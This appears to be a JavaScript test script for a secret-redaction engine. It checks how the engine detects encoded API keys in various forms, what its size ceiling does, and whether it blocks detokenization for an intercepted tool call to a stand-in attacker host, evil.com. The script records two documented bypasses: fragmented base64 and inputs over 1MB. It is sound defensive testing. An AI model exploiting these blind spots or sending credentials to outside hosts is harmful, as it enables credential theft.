const { VaultEngine } = require('../packages/bartholomew-vault/dist/vault_engine');
const assert = require('assert');

function runPhase5ScannerChallenge() {
  console.log('[*] Phase 5: Validating Vault Scanner Limits & Boundaries...');
  const vault = new VaultEngine();
  const rawKey = ['sk', 'live', '1234567890abcdefghijklmn'].join('_'); // standard 32-char synthetic test key

  const report = {};

  // 1. Standard Base64
  const stdB64 = Buffer.from(rawKey).toString('base64');
  const resStd = vault.tokenize(`Bearer ${stdB64}`);
  report.standard_base64 = {
    detected: resStd.tokenCount > 0,
    transformed: !resStd.sanitized.includes(stdB64),
    tokenCount: resStd.tokenCount
  };
  assert.strictEqual(report.standard_base64.detected, true, 'Standard Base64 must be detected');

  // 2. Base64URL (- and _)
  const urlSafeB64 = stdB64.replace(/\+/g, '-').replace(/\//g, '_');
  const resUrl = vault.tokenize(`Token: ${urlSafeB64}`);
  report.base64url = {
    detected: resUrl.tokenCount > 0,
    transformed: !resUrl.sanitized.includes(urlSafeB64),
    tokenCount: resUrl.tokenCount
  };
  assert.strictEqual(report.base64url.detected, true, 'Base64URL must be detected');

  // 3. Missing padding (unpadded)
  const unpaddedB64 = stdB64.replace(/=+$/, '');
  const resUnpadded = vault.tokenize(`Key: ${unpaddedB64}`);
  report.unpadded_base64 = {
    detected: resUnpadded.tokenCount > 0,
    transformed: !resUnpadded.sanitized.includes(unpaddedB64),
    tokenCount: resUnpadded.tokenCount
  };
  assert.strictEqual(report.unpadded_base64.detected, true, 'Unpadded Base64 must be detected');

  // 4. Line breaks and embedded whitespace inside base64
  const fragmentedB64 = stdB64.slice(0, 16) + '\n ' + stdB64.slice(16);
  const resFragmented = vault.tokenize(`Secret: ${fragmentedB64}`);
  report.fragmented_whitespace = {
    detected: resFragmented.tokenCount > 0,
    transformed: !resFragmented.sanitized.includes(rawKey),
    status: resFragmented.tokenCount > 0 ? 'DETECTED' : 'PASSED_THROUGH (DOCUMENTED BLIND SPOT)'
  };

  // 5. Multiple secrets in single input
  const rawKey2 = 'sk-ant-api03-1234567890abcdefghijklmnopqrstuvwxyz1234';
  const multiInput = `First: ${stdB64} Second: ${rawKey2}`;
  const resMulti = vault.tokenize(multiInput);
  report.multiple_secrets = {
    detected: resMulti.tokenCount >= 2,
    tokenCount: resMulti.tokenCount
  };
  assert.strictEqual(report.multiple_secrets.detected, true, 'Multiple secrets must be detected');

  // 6. Binary-like high entropy data (false-positive check)
  const pseudoBinary = Buffer.from(new Uint8Array([0x00, 0xFF, 0x12, 0x89, 0xFE, 0x33, 0x55, 0xAA, 0x77, 0x88, 0x99, 0xCC, 0xDD, 0xEE, 0x11, 0x22])).toString('base64');
  const resBinary = vault.tokenize(`Binary data: ${pseudoBinary}`);
  report.binary_false_positive = {
    detected: resBinary.tokenCount > 0,
    passed_through: resBinary.sanitized.includes(pseudoBinary)
  };
  assert.strictEqual(report.binary_false_positive.detected, false, 'Non-secret binary data must NOT be falsely tokenized');

  // 7. Inputs just below 1MB (1024 * 1024 - 100 bytes)
  const subMbPadding = 'A'.repeat(1024 * 1024 - 200);
  const resSubMb = vault.tokenize(`${subMbPadding} ${stdB64}`);
  report.sub_1mb = {
    detected: resSubMb.tokenCount > 0,
    transformed: !resSubMb.sanitized.includes(stdB64)
  };
  assert.strictEqual(report.sub_1mb.detected, true, 'Inputs below 1MB threshold must be scanned');

  // 8. Inputs just above 1MB (1024 * 1024 + 200 bytes)
  const overMbPadding = 'A'.repeat(1024 * 1024 + 200);
  const resOverMb = vault.tokenize(`${overMbPadding} ${stdB64}`);
  report.over_1mb = {
    detected: resOverMb.tokenCount > 0,
    status: 'PASSED_THROUGH (INTENTIONAL ReDoS MITIGATION CEILING)'
  };
  assert.strictEqual(report.over_1mb.detected, false, 'Inputs exceeding 1MB must skip deep scanning to prevent ReDoS');

  // 9. Detokenization destination authorization check
  const toolCallUnauthorized = vault.interceptMcpToolCall('network_request', { url: 'https://evil.com', auth: resStd.sanitized }, { isAuthorizedDestination: false });
  const toolCallAuthorized = vault.interceptMcpToolCall('db_query', { auth: resStd.sanitized }, { isAuthorizedDestination: true });
  report.detokenization_binding = {
    unauthorized_dest_tokenized: toolCallUnauthorized.tokensDetokenized === 0,
    authorized_dest_detokenized: toolCallAuthorized.tokensDetokenized > 0
  };
  assert.strictEqual(report.detokenization_binding.unauthorized_dest_tokenized, true);
  assert.strictEqual(report.detokenization_binding.authorized_dest_detokenized, true);

  console.log('[+] Phase 5 Scanner Limits Results:');
  console.log(JSON.stringify(report, null, 2));
  console.log('[+] Phase 5 Vault Scanner Challenge Passed.');
}

runPhase5ScannerChallenge();
